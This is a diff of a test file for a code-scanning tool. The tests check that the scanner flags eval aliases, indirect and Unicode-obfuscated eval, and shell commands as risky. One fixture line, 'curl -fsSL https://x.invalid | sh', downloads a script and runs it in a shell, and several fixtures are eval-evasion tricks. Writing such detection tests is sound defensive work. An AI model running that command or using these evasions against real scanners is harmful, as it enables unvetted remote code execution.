@@ -1084,15 +1084,75 @@ describe("scanForWarnings", () => {
 
     await rm(tempDir, { recursive: true, force: true });
     await mkdir(tempDir, { recursive: true });
-    await writeFile(
-      join(tempDir, "alias.js"),
-      "g.eval(x);\nthis.eval(x);\ntop.eval(x);\nwindow.parent.eval(code);\n",
-    );
+    await writeFile(join(tempDir, "alias.js"), "g.eval(x);\nthis.eval(x);\n");
     const alias = await scanForWarnings(tempDir);
     expect(alias.map((w) => w.category)).toEqual(
-      Array(4).fill(METHOD_CALL_CATEGORY),
+      Array(2).fill(METHOD_CALL_CATEGORY),
     );
     expect(classifyWarningRisk(alias)).toBe("medium");
+  });
+
+  test("global aliases, indirect eval and curl | sh are high risk (#815, #820)", async () => {
+    const files: Array<[string, string]> = [
+      ["a.js", "top.eval(x);\nwindow.parent.eval(code);\nframes.eval(x);"],
+      ["b.js", "const g = globalThis;\ng.eval(x);\n(0, eval)(x);"],
+      ["c.js", 'globalThis["eval"](x);\ndocument.defaultView.eval(x);'],
+      [
+        "d.py",
+        "\uff45\uff56\uff41\uff4c(code)\ngetattr(__builtins__, 'eval')(x)",
+      ],
+      ["e.sh", 'eval "$x"\ncurl -fsSL https://x.invalid | sh'],
+    ];
+    for (const [name, content] of files) {
+      await writeFile(join(tempDir, name), content);
+    }
+    const lines = (await scanForWarnings(tempDir))
+      .filter((w) => w.category !== "External URLs")
+      .map((w) => `${w.category}:${w.file}:${w.line}`);
+    expect([...new Set(lines)].sort()).toEqual(
+      [
+        "Code execution:a.js:1",
+        "Code execution:a.js:2",
+        "Code execution:a.js:3",
+        "Code execution:b.js:2",
+        "Code execution:b.js:3",
+        "Code execution:c.js:1",
+        "Code execution:c.js:2",
+        "Code execution:d.py:1",
+        "Code execution:d.py:2",
+        "Shell commands:e.sh:1",
+        "Shell commands:e.sh:2",
+      ].sort(),
+    );
+  });
+
+  test("heuristic rules are medium risk; AC3 must-pass lines stay safe (#815)", async () => {
+    await writeFile(
+      join(tempDir, "p.py"),
+      "f = eval if c else y\ngetattr(obj, 'eval')(x)\n",
+    );
+    await writeFile(join(tempDir, "t.js"), 'setTimeout("doIt()", 10);\n');
+    const possible = await scanForWarnings(tempDir);
+    expect(possible.map((w) => `${w.category}:${w.file}:${w.line}`)).toEqual(
+      expect.arrayContaining([
+        "Possible dynamic code execution:p.py:1",
+        "Possible dynamic code execution:p.py:2",
+        "Possible dynamic code execution:t.js:1",
+      ]),
+    );
+    expect(classifyWarningRisk(possible)).toBe("medium");
+
+    await rm(tempDir, { recursive: true, force: true });
+    await mkdir(tempDir, { recursive: true });
+    await writeFile(
+      join(tempDir, "ok.js"),
+      "const m = regex.exec(s);\nawait page.evaluate(() => 1);\nsetTimeout(fn, 100);\n",
+    );
+    await writeFile(join(tempDir, "ok.py"), "cursor.execute(q)\n");
+    // `regex.exec(` keeps its #809 method warning; nothing new is added.
+    expect(
+      (await scanForWarnings(tempDir)).map((w) => `${w.category}:${w.file}`),
+    ).toEqual([`${METHOD_CALL_CATEGORY}:ok.js`]);
   });
 
   test("round-3 bypasses are high risk: CR/LS/PS after def, escaped receivers (#809)", async () => {
